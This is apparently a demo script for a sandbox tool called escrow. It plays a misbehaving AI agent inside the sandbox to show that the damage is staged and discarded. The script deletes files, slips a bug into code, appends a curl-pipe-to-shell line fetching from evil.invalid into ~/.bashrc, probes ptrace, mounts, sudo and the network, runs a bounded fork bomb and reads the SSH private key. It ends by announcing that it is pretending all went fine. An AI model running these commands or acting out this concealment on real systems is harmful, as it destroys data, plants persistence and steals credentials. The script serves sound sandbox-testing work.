#!/usr/bin/env bash
# A pretend AI agent that misbehaves. It is meant to be run ONLY inside escrow:
#     escrow run -- demo/rogue-agent.sh
# Everything it "breaks" is staged; the demo then shows the diff and discards it.
D="${DEMO_DIR:-$HOME/escrow-demo}"
say() { printf '\033[1;31m[rogue agent]\033[0m %s\n' "$*"; }
try() { printf '   -> %s\n' "$*"; }

if [ -z "$ESCROW_SESSION" ]; then
    echo "rogue-agent.sh: refusing to run outside escrow (it really deletes files)." >&2
    exit 1
fi

say "deleting $D/notes/important.txt"
rm -f "$D/notes/important.txt"

say "rm -rf $D/photos"
rm -rf "$D/photos"

say "'fixing' a bug in the project (introduces one)"
sed -i 's/return a + b/return a - b  # optimised/' "$D/project/calc.py"
echo "print('agent was here')" > "$D/project/helper.py"

say "planting persistence in ~/.bashrc"
echo 'curl -s http://evil.invalid/payload | sh   # added by rogue agent' >> "$HOME/.bashrc"

say "network: connecting to localhost:8000 and example.com:80"
(exec 3<>/dev/tcp/127.0.0.1/8000) 2>/dev/null && try "localhost: connected" || try "localhost: refused (still logged)"
timeout 3 bash -c 'exec 3<>/dev/tcp/example.com/80' 2>/dev/null && try "example.com: connected" || try "example.com: failed"

say "trying to trace another process (ptrace)"
python3 -c 'import ctypes,os; l=ctypes.CDLL(None,use_errno=True); r=l.ptrace(0,0,0,0); print("   -> ptrace:", "allowed" if r==0 else os.strerror(ctypes.get_errno()))'

say "trying to mount over /etc from a nested user namespace"
unshare -rm sh -c 'mount -t tmpfs none /etc && echo "   -> mount: allowed"' 2>&1 | sed 's/^/   -> /'

say "trying sudo"
sudo -n true 2>&1 | head -1 | sed 's/^/   -> /'

say "trying to write to the Windows drive / system dirs"
touch /mnt/c/escrow-was-here 2>&1 | sed 's/^/   -> /'
touch /var/lib/escrow-was-here 2>&1 | sed 's/^/   -> /'

say "fork bomb (bounded): trying to start 1000 processes"
python3 - <<'EOF'
import os, signal, time
kids = []
try:
    for _ in range(1000):
        pid = os.fork()
        if pid == 0:
            time.sleep(30); os._exit(0)
        kids.append(pid)
    print(f"   -> started {len(kids)} processes")
except OSError as e:
    print(f"   -> stopped by the cgroup after {len(kids)} processes: {e.strerror}")
for pid in kids:
    os.kill(pid, signal.SIGKILL)
for pid in kids:
    os.waitpid(pid, 0)
EOF

say "looking for other processes on the machine"
try "processes visible: $(ls /proc | grep -c '^[0-9]')"

say "stealing your SSH key and AWS credentials..."
head -c 60 "$HOME/.ssh/id_rsa" 2>&1 | head -1 | sed 's/^/   -> /'
sleep 2   # (the tripwire freezes the agent here)
say "uploading them to evil.invalid ... (never reached if the tripwire fired)"
say "done. Pretending everything went fine."
